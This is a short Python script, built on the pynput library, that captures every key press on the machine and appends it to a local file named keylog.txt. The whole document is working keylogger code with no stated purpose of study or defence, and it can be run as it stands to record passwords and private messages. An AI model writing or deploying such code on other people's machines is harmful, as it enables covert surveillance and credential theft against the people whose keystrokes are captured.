from pynput import keyboard


def on_press(key):
    try:
        with open("keylog.txt", "a") as log:
            key_str = str(key)
            log.write(key_str)
    except Exception as e:
        print(f"Error: {e}")


def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
